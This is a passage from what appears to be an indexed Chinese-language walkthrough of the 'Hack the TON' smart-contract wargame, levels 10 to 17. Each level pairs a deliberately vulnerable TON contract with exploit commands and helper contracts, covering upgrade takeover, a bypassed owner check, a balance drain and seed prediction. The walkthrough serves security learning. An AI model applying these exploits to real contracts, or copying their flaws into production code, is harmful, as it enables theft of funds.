25)) + pow(msg.d, 25)) \u7684\u7ed3\u679c\u662f\u4e00\u4e2a\u6b63\u6574\u6570 1968172103452999492963878188028555943794336458502883276710491621054698698752 \u7531\u6b64\u63a8\u6d4b\u51fa\u4e24\u79cd\u53ef\u80fd\u7684\u60c5\u51b5 self.x \u4e3a 2\uff0c self.y \u4e3a 0\uff08\u53cd\u4e4b\u4ea6\u540c\uff09 self.x \u548c self.y \u540c\u4e3a 1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 t = 1968172103452999492963878188028555943794336458502883276710491621054698698752 for a in range ( 2 , 3000 ): c = - ( a - 2 ) r = pow ( a , 25 ) + pow ( c , 25 ) if r == t : print ( a , c ) break if r > t : break for a in range ( 1 , 3000 ): for b in range ( 1 , 3000 ): c , d = - ( a - 1 ), - ( b - 1 ) r = pow ( a , 25 ) + pow ( b , 25 ) + pow ( c , 25 ) + pow ( d , 25 ) if r == t : print ( a , b , c , d ) break else : continue break \u53d1\u9001\u7ed3\u679c\u5230\u5b9e\u4f8b\u5408\u7ea6 1 > await contract . send ( player , { value : toNano ( '0.01' )}, { $$type : 'Unlock' , a : 850 , b : 1200 , c : - 849 , d : - 1199 });","title":"10. BRUTE-FORCE"},{"location":"wargames/hack_the_ton/#11-tolk","text":"Unlock the contract below to complete this level. Tolk 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 const OP_UNLOCK = \"op::unlock\"c; // create an opcode from string using the \"c\" prefix, this results in 0xf0fd50bb opcode in this case // storage variables global ctxPlayer: slice; global ctxNonce: int; global ctxLocked: bool; // loadData populates storage variables using stored data fun loadData() { var ds = getContractData().beginParse(); ctxPlayer = ds.loadAddress(); ctxNonce = ds.loadUint(32); ctxLocked = ds.loadBool(); ds.assertEndOfSlice(); } // saveData stores storage variables as a cell into persistent storage fun saveData() { setContractData( beginCell() .storeSlice(ctxPlayer) .storeUint(ctxNonce, 32) .storeBool(ctxLocked) .endCell() ); } // onInternalMessage is the main function of the contract and is called when it receives a message from other contracts fun onInternalMessage(myBalance: int, msgValue: int, inMsgFull: cell, inMsgBody: slice) { if (inMsgBody.isEndOfSlice()) { // ignore all empty messages return; } var cs: slice = inMsgFull.beginParse(); val flags: int = cs.loadUint(4); if (flags & 1) { // ignore all bounced messages return; } val senderAddress: slice = cs.loadAddress(); loadData(); // here we populate the storage variables val op: int = inMsgBody.loadUint(32); // by convention, the first 32 bits of incoming message is the op // receive \"check\" message if (isSliceBitsEqual(inMsgBody, \"check\")) { // send CheckLevelResult msg val msgBody: cell = beginCell() .storeUint(0x6df37b4d, 32) .storeRef(beginCell().storeSlice(\"tolk\").endCell()) .storeBool(!ctxLocked) .endCell(); val msg: builder = beginCell() .storeUint(0x18, 6) .storeSlice(senderAddress) .storeCoins(0) .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1) .storeRef(msgBody); // send all the remaining value sendRawMessage(msg.endCell(), 64); return; } if (op == OP_UNLOCK) { ctxLocked = false; saveData(); return; } throw 0xffff; // if the message contains an op that is not known to this contract, we throw } // get methods are a means to conveniently read contract data using, for example, HTTP APIs // note that unlike in many other smart contract VMs, get methods cannot be called by other contracts get locked(): bool { loadData(); return ctxLocked; } \u53d1\u9001 OP_UNLOCK \u5bf9\u5e94\u7684\u64cd\u4f5c\u7801\u5373\u53ef\u89e3\u9501\u3002 1 > await contract . send ( player , beginCell (). storeUint ( 0xf0fd50bb , 32 ). endCell (), toNano ( '0.005' ));","title":"11. TOLK"},{"location":"wargames/hack_the_ton/#12-upgrade","text":"Unlock the contract below to complete this level. Upgrade 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 const OP_UPGRADE = \"op::upgrade\"c; // create an opcode from string using the \"c\" prefix, this results in 0xdbfaf817 opcode in this case // storage variables global ctxPlayer: slice; global ctxNonce: int; global ctxLocked: bool; // loadData populates storage variables using stored data fun loadData() { var ds = getContractData().beginParse(); ctxPlayer = ds.loadAddress(); ctxNonce = ds.loadUint(32); ctxLocked = ds.loadBool(); ds.assertEndOfSlice(); } // onInternalMessage is the main function of the contract and is called when it receives a message from other contracts fun onInternalMessage(myBalance: int, msgValue: int, inMsgFull: cell, inMsgBody: slice) { if (inMsgBody.isEndOfSlice()) { // ignore all empty messages return; } var cs: slice = inMsgFull.beginParse(); val flags: int = cs.loadUint(4); if (flags & 1) { // ignore all bounced messages return; } val senderAddress: slice = cs.loadAddress(); loadData(); // here we populate the storage variables val op: int = inMsgBody.loadUint(32); // by convention, the first 32 bits of incoming message is the op // receive \"check\" message if (isSliceBitsEqual(inMsgBody, \"check\")) { // send CheckLevelResult msg val msgBody: cell = beginCell() .storeUint(0x6df37b4d, 32) .storeRef(beginCell().storeSlice(\"upgrade\").endCell()) .storeBool(!ctxLocked) .endCell(); val msg: builder = beginCell() .storeUint(0x18, 6) .storeSlice(senderAddress) .storeCoins(0) .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1) .storeRef(msgBody); // send all the remaining value sendRawMessage(msg.endCell(), 64); return; } if (op == OP_UPGRADE) { val code: cell = inMsgBody.loadRef(); setContractCodePostponed(code); return; } throw 0xffff; // if the message contains an op that is not known to this contract, we throw } // get methods are a means to conveniently read contract data using, for example, HTTP APIs // note that unlike in many other smart contract VMs, get methods cannot be called by other contracts get locked(): bool { loadData(); return ctxLocked; } \u5411\u5408\u7ea6\u53d1\u9001 OP_UPGRADE \u6d88\u606f\u53ef\u4ee5\u66f4\u65b0\u5408\u7ea6\u7684\u4ee3\u7801 1 2 3 4 5 if (op == OP_UPGRADE) { val code: cell = inMsgBody.loadRef(); setContractCodePostponed(code); return; } \u53ef\u4ee5\u5728\u65b0\u4ee3\u7801\u4e2d\u589e\u52a0\u66f4\u65b0\u5b58\u50a8\u7684\u903b\u8f91 1 2 3 4 5 6 if (op == 0x12345678) { setContractData( beginCell().storeSlice(ctxPlayer).storeUint(ctxNonce, 32).storeBool(false).endCell() ); return; } \u66f4\u65b0\u4ee3\u7801\u5e76\u89e3\u9501 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 export async function run ( provider : NetworkProvider , args : string []) { const ui = provider . ui (); const address = Address . parse ( args . length > 0 ? args [ 0 ] : await ui . input ( 'old address' )); const oldContract = provider . open ( Upgrade . createFromAddress ( address )); await oldContract . send ( provider . sender (), beginCell (). storeUint ( 0xdbfaf817 , 32 ). storeRef ( await compile ( \"Upgrade\" )). endCell (), toNano ( '0.05' ) ); sleep ( 10000 ); await oldContract . send ( provider . sender (), beginCell (). storeUint ( 0x12345678 , 32 ). endCell (), toNano ( '0.01' ) ); }","title":"12. UPGRADE"},{"location":"wargames/hack_the_ton/#13-access","text":"Unlock the contract below to complete this level. Access 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 #include \"../imports/stdlib.fc\" ; const op :: unlock = \"op::unlock\" c ; ;; create an opcode from string using the \"c\" prefix , this results in 0xf0fd50bb opcode in this case const op :: change_owner = \"op::change_owner\" c ; ;; create an opcode from string using the \"c\" prefix , this results in 0xf1eef33c opcode in this case const op :: change_nonce = \"op::change_nonce\" c ; ;; create an opcode from string using the \"c\" prefix , this results in 0x8caa87bd opcode in this case ;; storage variables global slice ctx_player ; global int ctx_nonce ; global slice ctx_owner ; global int ctx_locked ; ;; load_data populates storage variables using stored data () load_data () impure { var ds = get_data (). begin_parse () ; ctx_player = ds ~ load_msg_addr () ; ctx_nonce = ds ~ load_uint ( 32 ) ; ctx_owner = ds ~ load_msg_addr () ; ctx_locked = ds ~ load_int ( 1 ) ; ds . end_parse () ; } ;; save_data stores storage variables as a cell into persistent storage () save_data () impure { set_data ( begin_cell () . store_slice ( ctx_player ) . store_uint ( ctx_nonce , 32 ) . store_slice ( ctx_owner ) . store_int ( ctx_locked , 1 ) . end_cell () ) ; } () check_owner ( slice sender ) { throw_unless ( 501 , equal_slice_bits ( sender , ctx_owner )) ; } ;; recv_internal is the main function of the contract and is called when it receives a message from other contracts () recv_internal ( int my_balance , int msg_value , cell in_msg_full , slice in_msg_body ) impure { if ( in_msg_body . slice_empty ? ()) { ;; ignore all empty messages return () ; } slice cs = in_msg_full . begin_parse () ; int flags = cs ~ load_uint ( 4 ) ; if ( flags & 1 ) { ;; ignore all bounced messages return () ; } slice sender_address = cs ~ load_msg_addr () ; load_data () ; ;; here we populate the storage variables int op = in_msg_body ~ load_uint ( 32 ) ; ;; by convention , the first 32 bits of incoming message is the op ;; receive \"check\" message if ( equal_slice_bits ( in_msg_body , \"check\" )) { ;; send CheckLevelResult msg cell msg_body = begin_cell () . store_uint ( 0x6df37b4d , 32 ) . store_ref ( begin_cell (). store_slice ( \"access\" ). end_cell ()) . store_int ( ~ ctx_locked , 1 ) . end_cell () ; builder msg = begin_cell () . store_uint ( 0x18 , 6 ) . store_slice ( sender_address ) . store_coins ( 0 ) . store_uint ( 1 , 1 + 4 + 4 + 64 + 32 + 1 + 1 ) . store_ref ( msg_body ) ; ;; send all the remaining value send_raw_message ( msg . end_cell (), 64 ) ; return () ; } if ( op == op :: unlock ) { ctx_locked = ~ equal_slice_bits ( ctx_player , ctx_owner ) ; save_data () ; return () ; } if ( op == op :: change_owner ) { check_owner ( sender_address ) ; throw_unless ( 502 , ctx_nonce == 9999 ) ; ctx_owner = in_msg_body ~ load_msg_addr () ; save_data () ; return () ; } if ( op == op :: change_nonce ) { ctx_nonce = in_msg_body ~ load_uint ( 32 ) ; save_data () ; return () ; } throw ( 0xffff ) ; ;; if the message contains an op that is not known to this contract , we throw } ;; get methods are a means to conveniently read contract data using , for example , HTTP APIs ;; they are marked with method_id ;; note that unlike in many other smart contract VMs , get methods cannot be called by other contracts int nonce () method_id { load_data () ; return ctx_nonce ; } slice owner () method_id { load_data () ; return ctx_owner ; } int locked () method_id { load_data () ; return ctx_locked ; } \u89e3\u9501\u9700\u8981 ctx_owner \u662f ctx_player 1 2 3 4 5 if ( op == op :: unlock ) { ctx_locked = ~ equal_slice_bits ( ctx_player , ctx_owner ); save_data (); return (); } \u64cd\u4f5c op::change_owner \u8c03\u7528\u51fd\u6570 check_owner() \u68c0\u67e5\u8c03\u7528\u8005\u662f\u5426\u4e3a ctx_owner \uff0c\u4f46\u7531\u4e8e\u672a\u4f7f\u7528 impure \u6807\u8bc6\u7b26\u4e14\u6ca1\u6709\u68c0\u67e5\u51fd\u6570\u8c03\u7528\u7684\u7ed3\u679c\uff0c\u8be5\u51fd\u6570\u8c03\u7528\u4f1a\u5728\u7f16\u8bd1\u65f6\u88ab\u79fb\u9664 1 2 3 () check_owner ( slice sender ) { throw_unless ( 501 , equal_slice_bits ( sender , ctx_owner )); } \u56e0\u6b64\uff0c\u5148\u4fee\u6539 ctx_nonce \u518d\u66f4\u65b0 ctx_owner \uff0c\u5373\u53ef\u89e3\u9501 1 2 3 > await contract . send ( player , beginCell (). storeUint ( 0x8caa87bd , 32 ). storeUint ( 9999 , 32 ). endCell (), toNano ( \"0.01\" )); > await contract . send ( player , beginCell (). storeUint ( 0xf1eef33c , 32 ). storeAddress ( player . address ). endCell (), toNano ( \"0.01\" )); > await contract . send ( player , beginCell (). storeUint ( 0xf0fd50bb , 32 ). endCell (), toNano ( \"0.01\" ));","title":"13. ACCESS"},{"location":"wargames/hack_the_ton/#14-donate","text":"You will beat this level if you manage to reduce its balance to 0. Donate 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 #include \"../imports/stdlib.fc\" ; const donation_goal = 1000000000 ; const gas_consumption = 5000000 ; const op :: change_destination = \"op::change_destination\" c ; ;; create an opcode from string using the \"c\" prefix , this results in 0xbaed25a6 opcode in this case const op :: withdraw = \"op::withdraw\" c ; ;; create an opcode from string using the \"c\" prefix , this results in 0xcb03bfaf opcode in this case const op :: donate = \"op::donate\" c ; ;; create an opcode from string using the \"c\" prefix , this results in 0x47bbe425 opcode in this case ;; storage variables global slice player ; global int nonce ; global slice owner ; global slice destination ; global int donations_count ; ;; load_data populates storage variables using stored data () load_data () impure { var ds = get_data (). begin_parse () ; player = ds ~ load_msg_addr () ; nonce = ds ~ load_uint ( 32 ) ; owner = ds ~ load_msg_addr () ; destination = ds ~ load_msg_addr () ; donations_count = ds ~ load_uint ( 32 ) ; ds . end_parse () ; } ;; save_data stores storage variables as a cell into persistent storage () save_data () impure { set_data ( begin_cell () . store_slice ( player ) . store_uint ( nonce , 32 ) . store_slice ( owner ) . store_slice ( destination ) . store_uint ( donations_count , 32 ) . end_cell () ) ; } ;; recv_internal is the main function of the contract and is called when it receives a message from other contracts () recv_internal ( int my_balance , int msg_value , cell in_msg_full , slice in_msg_body ) impure { if ( in_msg_body . slice_empty ? ()) { ;; ignore all empty messages return () ; } slice cs = in_msg_full . begin_parse () ; int flags = cs ~ load_uint ( 4 ) ; if ( flags & 1 ) { ;; ignore all bounced messages return () ; } slice sender_address = cs ~ load_msg_addr () ; load_data () ; ;; here we populate the storage variables int op = in_msg_body ~ load_uint ( 32 ) ; ;; by convention , the first 32 bits of incoming message is the op ;; receive \"check\" message if ( equal_slice_bits ( in_msg_body , \"check\" )) { ;; send CheckLevelResult msg cell msg_body = begin_cell () . store_uint ( 0x6df37b4d , 32 ) . store_ref ( begin_cell (). store_slice ( \"donate\" ). end_cell ()) . store_int ( my_balance - msg_value == 0 , 1 ) . end_cell () ; builder msg = begin_cell () . store_uint ( 0x18 , 6 ) . store_slice ( sender_address ) . store_coins ( 0 ) . store_uint ( 1 , 1 + 4 + 4 + 64 + 32 + 1 + 1 ) . store_ref ( msg_body ) ; ;; send all the remaining value send_raw_message ( msg . end_cell (), 64 ) ; return () ; } if ( op == op :: change_destination ) { throw_unless ( 501 , equal_slice_bits ( sender_address , owner )) ; var new_destination = in_msg_body ~ load_msg_addr () ; destination = new_destination ; save_data () ; return () ; } if ( op == op :: withdraw ) { throw_unless ( 502 , equal_slice_bits ( sender_address , destination )) ; builder msg = begin_cell () . store_uint ( 0x18 , 6 ) . store_slice ( destination ) . store_coins ( 0 ) . store_uint ( 0 , 1 + 4 + 4 + 64 + 32 + 1 + 1 ) ; ;; send all the contract balance send_raw_message ( msg . end_cell (), 128 ) ; return () ; } if ( op == op :: donate ) { throw_unless ( 503 , my_balance - msg_value < donation_goal ) ; if ( my_balance > donation_goal ) { var destination = in_msg_body ~ load_msg_addr () ; builder msg = begin_cell () . store_uint ( 0x18 , 6 ) . store_slice ( destination ) . store_coins ( my_balance - donation_goal - gas_consumption ) . store_uint ( 0 , 1 + 4 + 4 + 64 + 32 + 1 + 1 ) ; send_raw_message ( msg . end_cell (), 0 ) ; } donations_count += 1 ; save_data () ; return () ; } throw ( 0xffff ) ; ;; if the message contains an op that is not known to this contract , we throw } ;; get methods are a means to conveniently read contract data using , for example , HTTP APIs ;; they are marked with method_id ;; note that unlike in many other smart contract VMs , get methods cannot be called by other contracts slice _owner () method_id { load_data () ; return owner ; } slice _destination () method_id { load_data () ; return destination ; } int _donations_count () method_id { load_data () ; return donations_count ; } int balance () method_id { [ int value , _ ] = get_balance () ; return value ; } \u64cd\u4f5c op::withdraw \u53ef\u4ee5\u5c06\u5408\u7ea6\u6240\u6301\u6709\u7684\u6240\u6709 TON \u90fd\u53d1\u9001\u7ed9\u8c03\u7528\u8005 destination \u4fee\u6539 destination \u7684\u64cd\u4f5c op::change_destination \u53ea\u6709 owner \u53ef\u4ee5\u8c03\u7528 \u7531\u4e8e\u5168\u5c40\u53d8\u91cf\u4e0d\u80fd\u88ab\u91cd\u5b9a\u4e49\uff0c\u5f53\u5408\u7ea6\u4f59\u989d\u5927\u4e8e donation_goal \u65f6\uff0c\u64cd\u4f5c op::donate \u5b9e\u9645\u4e0a\u66f4\u65b0\u7684\u662f\u5168\u5c40\u53d8\u91cf destination \uff0c\u800c\u4e0d\u662f\u5176\u5b9a\u4e49\u7684\u672c\u5730\u53d8\u91cf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 if ( op == op :: donate ) { throw_unless ( 503 , my_balance - msg_value < donation_goal ); if ( my_balance > donation_goal ) { var destination = in_msg_body ~ load_msg_addr (); builder msg = begin_cell () . store_uint ( 0x18 , 6 ) . store_slice ( destination ) . store_coins ( my_balance - donation_goal - gas_consumption ) . store_uint ( 0 , 1 + 4 + 4 + 64 + 32 + 1 + 1 ); send_raw_message ( msg . end_cell (), 0 ); } donations_count += 1 ; save_data (); return (); } \u6350\u6b3e\u5e76\u8bbe\u7f6e destination \uff0c\u968f\u540e\u53d1\u9001 op::withdraw \u6d88\u606f 1 2 > await contract . send ( player , beginCell (). storeUint ( 0x47bbe425 , 32 ). storeAddress ( player . address ). endCell (), toNano ( 1 )); > await contract . send ( player , beginCell (). storeUint ( 0xcb03bfaf , 32 ). endCell (), toNano ( \"0.01\" ));","title":"14. DONATE"},{"location":"wargames/hack_the_ton/#references_4","text":"Variable declaration","title":"References"},{"location":"wargames/hack_the_ton/#15-logical","text":"Unlock the contract below to complete this level. Logical 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 // storage variables global ctxPlayer: slice; global ctxNonce: int; global ctxLocked: bool; global ctxPrevLogicalTime: int; global ctxLogicalTimeDiff: int; // loadData populates storage variables using stored data fun loadData() { var ds = getContractData().beginParse(); ctxPlayer = ds.loadAddress(); ctxNonce = ds.loadUint(32); ctxLocked = ds.loadBool(); ctxPrevLogicalTime = ds.loadUint(64); ctxLogicalTimeDiff = ds.loadUint(32); ds.assertEndOfSlice(); } // saveData stores storage variables as a cell into persistent storage fun saveData() { setContractData( beginCell() .storeSlice(ctxPlayer) .storeUint(ctxNonce, 32) .storeBool(ctxLocked) .storeUint(ctxPrevLogicalTime, 64) .storeUint(ctxLogicalTimeDiff, 32) .endCell() ); } // onInternalMessage is the main function of the contract and is called when it receives a message from other contracts fun onInternalMessage(myBalance: int, msgValue: int, inMsgFull: cell, inMsgBody: slice) { if (inMsgBody.isEndOfSlice()) { // ignore all empty messages return; } var cs: slice = inMsgFull.beginParse(); val flags: int = cs.loadUint(4); if (flags & 1) { // ignore all bounced messages return; } val senderAddress: slice = cs.loadAddress(); loadData(); // here we populate the storage variables inMsgBody.skipBits(32); // by convention, the first 32 bits of incoming message is the op // receive \"check\" message if (isSliceBitsEqual(inMsgBody, \"check\")) { // send CheckLevelResult msg val msgBody: cell = beginCell() .storeUint(0x6df37b4d, 32) .storeRef(beginCell().storeSlice(\"logical\").endCell()) .storeBool(!ctxLocked) .endCell(); val msg: builder = beginCell() .storeUint(0x18, 6) .storeSlice(senderAddress) .storeCoins(0) .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1) .storeRef(msgBody); // send all the remaining value sendRawMessage(msg.endCell(), 64); return; } if (getLogicalTime() - ctxPrevLogicalTime == ctxLogicalTimeDiff) { ctxLocked = false; } ctxPrevLogicalTime = getLogicalTime(); saveData(); } // get methods are a means to conveniently read contract data using, for example, HTTP APIs // note that unlike in many other smart contract VMs, get methods cannot be called by other contracts get locked(): bool { loadData(); return ctxLocked; } get prevLogicalTime(): int { loadData(); return ctxPrevLogicalTime; } get logicalTimeDiff(): int { loadData(); return ctxLogicalTimeDiff; } \u5f53\u5f53\u524d\u4ea4\u6613\u7684\u903b\u8f91\u65f6\u95f4\u548c\u4e0a\u4e00\u4ea4\u6613\u7684\u903b\u8f91\u65f6\u95f4\u4e4b\u5dee\u4e3a ctxLogicalTimeDiff \u65f6\uff0c\u53ef\u4ee5\u89e3\u9501 1 2 3 4 if (getLogicalTime() - ctxPrevLogicalTime == ctxLogicalTimeDiff) { ctxLocked = false; } ctxPrevLogicalTime = getLogicalTime(); \u83b7\u53d6 ctxLogicalTimeDiff \u7684\u503c 1 2 > await contract . getLogicalTimeDiff (); 1n \u7531\u4e8e\u8981\u6c42\u903b\u8f91\u65f6\u95f4\u5dee\u4ec5\u4e3a 1\uff0c\u53ef\u4ee5\u4ece\u540c\u4e00\u4e2a\u5408\u7ea6\u4e2d\u53d1\u51fa\u4e24\u6761\u6d88\u606f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import \"@stdlib/deploy\" ; message Send { target : Address ; } contract MultiMessageSender with Deployable { receive ( msg : Send ) { repeat ( 2 ) { send ( SendParameters { to : msg . target , value : ton ( \"0.008\" ), mode : SendDefaultMode + SendPayGasSeparately , body : beginCell (). storeUint ( 0 , 32 ). endCell () }); } } }","title":"15. LOGICAL"},{"location":"wargames/hack_the_ton/#16-seed","text":"Unlock the contract below to complete this level. Seed 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 const OP_UNLOCK = \"op::unlock\"c; // create an opcode from string using the \"c\" prefix, this results in 0xf0fd50bb opcode in this case // storage variables global ctxPlayer: slice; global ctxNonce: int; global ctxLocked: bool; global ctxSeed: int; // loadData populates storage variables using stored data fun loadData() { var ds = getContractData().beginParse(); ctxPlayer = ds.loadAddress(); ctxNonce = ds.loadUint(32); ctxLocked = ds.loadBool(); ctxSeed = ds.loadUint(256); ds.assertEndOfSlice(); } // saveData stores storage variables as a cell into persistent storage fun saveData() { setContractData( beginCell() .storeSlice(ctxPlayer) .storeUint(ctxNonce, 32) .storeBool(ctxLocked) .storeUint(ctxSeed, 256) .endCell() ); } // onInternalMessage is the main function of the contract and is called when it receives a message from other contracts fun onInternalMessage(myBalance: int, msgValue: int, inMsgFull: cell, inMsgBody: slice) { if (inMsgBody.isEndOfSlice()) { // ignore all empty messages return; } var cs: slice = inMsgFull.beginParse(); val flags: int = cs.loadUint(4); if (flags & 1) { // ignore all bounced messages return; } val senderAddress: slice = cs.loadAddress(); loadData(); // here we populate the storage variables val op: int = inMsgBody.loadUint(32); // by convention, the first 32 bits of incoming message is the op // receive \"check\" message if (isSliceBitsEqual(inMsgBody, \"check\")) { // send CheckLevelResult msg val msgBody: cell = beginCell() .storeUint(0x6df37b4d, 32) .storeRef(beginCell().storeSlice(\"seed\").endCell()) .storeBool(!ctxLocked) .endCell(); val msg: builder = beginCell() .storeUint(0x18, 6) .storeSlice(senderAddress) .storeCoins(0) .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1) .storeRef(msgBody); // send all the remaining value sendRawMessage(msg.endCell(), 64); return; } if (op == OP_UNLOCK) { val guess: int = inMsgBody.loadUint(256); if (ctxSeed == 0) { ctxSeed = random(); } randomSetSeed(ctxSeed); ctxSeed = random(); if (guess == ctxSeed) { ctxLocked = false; } saveData(); return; } throw 0xffff; // if the message contains an op that is not known to this contract, we throw } // get methods are a means to conveniently read contract data using, for example, HTTP APIs // note that unlike in many other smart contract VMs, get methods cannot be called by other contracts get locked(): bool { loadData(); return ctxLocked; } get seed(): int { loadData(); return ctxSeed; } \u5f53 ctxSeed \u4e0d\u4e3a 0 \u65f6\uff0c\u5c06\u76f4\u63a5\u8bbe\u7f6e seed \u5e76\u83b7\u53d6\u968f\u673a\u6570\u4f5c\u4e3a\u4e0b\u4e00\u4e2a seed 1 2 3 4 5 6 7 8 9 10 11 12 13 if (op == OP_UNLOCK) { val guess: int = inMsgBody.loadUint(256); if (ctxSeed == 0) { ctxSeed = random(); } randomSetSeed(ctxSeed); ctxSeed = random(); if (guess == ctxSeed) { ctxLocked = false; } saveData(); return; } \u53d1\u9001\u4e00\u6761\u6d88\u606f\u521d\u59cb\u5316 seed 1 > await contract . send ( player , beginCell (). storeUint ( 0xf0fd50bb , 32 ). storeUint ( 0 , 256 ). endCell (), toNano ( \"0.01\" )); \u5728\u5df2\u77e5 seed \u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u901a\u8fc7\u8f85\u52a9\u5408\u7ea6\u83b7\u53d6\u968f\u673a\u7684\u7ed3\u679c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import \"@stdlib/deploy\" ; message Random { prevSeed : Int as uint256 ; target : Address ; } contract Guesser with Deployable { receive ( msg : Random ) { setSeed ( msg . prevSeed ); let guess : Int = nativeRandom (); send ( SendParameters { to : msg . target , value : ton ( \"0.008\" ), mode : SendDefaultMode + SendPayGasSeparately , body : beginCell (). storeUint ( 0xf0fd50bb , 32 ). storeUint ( guess , 256 ). endCell () }); } }","title":"16. SEED"},{"location":"wargames/hack_the_ton/#references_5","text":"Random number generation nativeRandom","title":"References"},{"location":"wargames/hack_the_ton/#17-token","text":"You will beat this level if you manage to acquire tokens amount equivalent to total token supply. Token 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 import \"@stdlib/tvm-dicts\" const OP_MINT = \"op::mint\"c; // create an opcode from string using the \"c\" prefix, this results in 0xecad15c4 opcode in this case const OP_TRANSFER = \"op::transfer\"c; // create an opcode from string using the \"c\" prefix, this results in 0x3ee943f1 opcode in this case // storage variables global ctxPlayer: slice; global ctxNonce: int; global ctxOwner: slice; global ctxBalances: cell; global ctxTotalSupply: int; // loadData populates storage variables using stored data fun loadData() { var ds = getContractData().beginParse(); ctxPlayer = ds.loadAddress(); ctxNonce = ds.loadUint(32); ctxOwner = ds.loadAddress(); ctxBalances = ds.loadDict(); ctxTotalSupply = ds.loadUint(256); ds.assertEndOfSlice(); } // saveData stores storage variables as a cell into persistent storage fun saveData() { setContractData( beginCell() .storeSlice(ctxPlayer) .storeUint(ctxNonce, 32) .storeSlice(ctxOwner) .storeDict(ctxBalances) .storeUint(ctxTotalSupply, 256) .endCell() ); } fun getBalance(balances: cell, account: slice): int { var (_, value: slice, _, isFound: bool) = balances.prefixDictGet(account.getRemainingBitsCount(), account); if (!isFound) { return 0; } return value.loadUint(256); } fun setBalance(mutate self: cell, account: slice, amount: int): void { // will throw if amount is negative val isSuccess: bool = self.prefixDictSet(account.getRemainingBitsCount(), account, beginCell().storeUint(amount, 256).endCell().beginParse()); assert(isSuccess, 501); } fun mint(balances: cell, to: slice, amount: int): cell { var toBalance: int = getBalance(balances, to); toBalance += amount; balances.setBalance(to, toBalance); return balances; } fun transfer(balances: cell, from: slice, to: slice, amount: int): cell { var fromBalance: int = getBalance(balances, from); var toBalance: int = getBalance(balances, to); fromBalance -= amount; toBalance += amount; assert(fromBalance > 0, 502); balances.setBalance(from, fromBalance); balances.setBalance(to, toBalance); return balances; } // onInternalMessage is the main function of the contract and is called when it receives a message from other contracts fun onInternalMessage(myBalance: int, msgValue: int, inMsgFull: cell, inMsgBody: slice) { if (inMsgBody.isEndOfSlice()) { // ignore all empty messages return; } var cs: slice = inMsgFull.beginParse(); val flags: int = cs.loadUint(4); if (flags & 1) { // ignore all bounced messages return; } val senderAddress: slice = cs.loadAddress(); loadData(); // here we populate the storage variables val op: int = inMsgBody.loadUint(32); // by convention, the first 32 bits of incoming message is the op // receive \"check\" message if (isSliceBitsEqual(inMsgBody, \"check\")) { // send CheckLevelResult msg val msgBody: cell = beginCell() .storeUint(0x6df37b4d, 32) .storeRef(beginCell().storeSlice(\"token\").endCell()) .storeBool(getBalance(ctxBalances, ctxPlayer) == ctxTotalSupply) .endCell(); val msg: builder = beginCell() .storeUint(0x18, 6) .storeSlice(senderAddress) .storeCoins(0) .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1) .storeRef(msgBody); // send all the remaining value sendRawMessage(msg.endCell(), 64); return; } if (op == OP_MINT) { 